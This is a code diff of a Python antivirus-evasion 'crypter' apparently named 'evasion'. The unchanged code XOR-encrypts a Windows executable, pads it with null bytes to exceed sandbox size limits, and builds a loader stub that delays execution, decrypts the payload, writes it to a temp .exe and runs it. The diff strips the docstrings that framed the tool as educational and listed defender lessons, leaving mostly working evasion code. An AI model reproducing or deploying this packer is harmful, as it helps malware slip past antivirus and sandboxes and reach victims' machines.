@@ -22,7 +22,7 @@ import hashlib
 import logging
 from pathlib import Path
 
-# ─── Logging Setup ───────────────────────────────────────────────────────────
+# Logging Setup 
 logging.basicConfig(
     level=logging.INFO,
     format="[%(levelname)s] %(message)s"
@@ -30,19 +30,11 @@ logging.basicConfig(
 log = logging.getLogger("evasion")
 
 
-# ─── XOR Encryption ──────────────────────────────────────────────────────────
+#  XOR Encryption
 
 def generate_key(length: int = 32) -> bytes:
     """
     Generate a random XOR key.
-
-    WHY XOR?
-    XOR is symmetric (encrypt == decrypt), fast, and commonly used in
-    real-world malware as a first layer of obfuscation. It breaks static
-    signature matching because the encrypted bytes look like random noise.
-    A defender building a YARA rule, for example, cannot match on the
-    original byte sequence once XOR is applied.
-
     Args:
         length: Key length in bytes (default 32 for decent entropy).
 
@@ -55,10 +47,6 @@ def generate_key(length: int = 32) -> bytes:
 def xor_encrypt(data: bytes, key: bytes) -> bytes:
     """
     XOR-encrypt (or decrypt — same operation) a byte sequence.
-
-    The key is cycled using modulo so it works on data of any length.
-    This mirrors the rolling-XOR technique seen in commodity malware loaders.
-
     Args:
         data: Raw bytes to encrypt.
         key:  XOR key bytes.
@@ -69,22 +57,11 @@ def xor_encrypt(data: bytes, key: bytes) -> bytes:
     return bytes(b ^ key[i % len(key)] for i, b in enumerate(data))
 
 
-# ─── File Size Manipulation ───────────────────────────────────────────────────
+# File Size Manipulation
 
 def pad_binary(data: bytes, target_mb: int) -> bytes:
     """
     Inflate binary size with null-byte padding to reach target_mb.
-
-    WHY SIZE MANIPULATION?
-    Many AV sandboxes and automated scanners skip files above a threshold
-    (commonly 50–100 MB) because executing them would consume too many
-    resources. Attackers abuse this heuristic to bypass cloud-based sandboxes.
-
-    Understanding this helps defenders:
-    - Set appropriate file-size caps in policies
-    - Flag unusually large executables in EDR telemetry
-    - Alert on binaries with large zero-byte regions (entropy analysis)
-
     Args:
         data:      Original encrypted binary bytes.
         target_mb: Desired final file size in megabytes.
@@ -110,24 +87,10 @@ def pad_binary(data: bytes, target_mb: int) -> bytes:
     return data + padding
 
 
-# ─── Stub Generator ──────────────────────────────────────────────────────────
-
+# Stub Generator 
 def build_loader_stub(key: bytes, delay: int, original_hash: str) -> str:
     """
     Generate a Python loader stub that decrypts and executes the payload.
-
-    WHY A LOADER STUB?
-    Real malware uses a small, clean 'stub' loader whose job is purely to
-    decrypt and run the actual payload in memory. The loader itself has no
-    malicious signatures — the payload never touches disk in decrypted form.
-
-    This educational stub writes to a temp file for simplicity. A production
-    attacker would use reflective loading (running directly from memory),
-    which is far harder to detect. Understanding stubs helps defenders:
-    - Write behavioral rules (process spawning from unusual parents)
-    - Detect decrypt-and-execute patterns in memory forensics
-    - Identify sleep/delay artifacts in sandbox reports
-
     Args:
         key:           XOR key (encoded as hex string in the stub).
         delay:         Execution delay in seconds.
@@ -156,11 +119,11 @@ def main():
     with open(exe_path, "rb") as f:
         raw = f.read()
 
-    # ── Execution delay (sandbox evasion heuristic) ──
+    # Execution delay (sandbox evasion heuristic)
     print(f"[INFO] Execution delayed by {{DELAY}} seconds...")
     time.sleep(DELAY)
 
-    # ── Strip loader stub prefix to isolate encrypted payload ──
+    # Strip loader stub prefix to isolate encrypted payload 
     marker = b"##PAYLOAD_START##"
     idx = raw.find(marker)
     if idx == -1:
@@ -168,17 +131,17 @@ def main():
         sys.exit(1)
     encrypted_payload = raw[idx + len(marker):]
 
-    # ── Decrypt ──
+    #  Decrypt
     decrypted = xor_decrypt(encrypted_payload, KEY)
     print("[INFO] Binary decrypted successfully.")
 
-    # ── Integrity check ──
+    # Integrity check 
     digest = hashlib.sha256(decrypted).hexdigest()
     if digest != EXPECTED_HASH:
         print("[ERROR] Integrity check failed. Binary may be tampered.")
         sys.exit(1)
 
-    # ── Write to temp and execute ──
+    #  Write to temp and execute 
     with tempfile.NamedTemporaryFile(delete=False, suffix=".exe") as tmp:
         tmp.write(decrypted)
         tmp_path = tmp.name
@@ -193,7 +156,7 @@ if __name__ == "__main__":
     return stub
 
 
-# ─── Core Encrypt Routine ─────────────────────────────────────────────────────
+#  Core Encrypt Routine 
 
 def encrypt_binary(
     target_path: str,
@@ -256,8 +219,7 @@ def encrypt_binary(
     log.info(f"Execution delay embedded: {delay}s")
 
 
-# ─── CLI ──────────────────────────────────────────────────────────────────────
-
+#cli
 def build_parser() -> argparse.ArgumentParser:
     parser = argparse.ArgumentParser(
         prog="evasion",
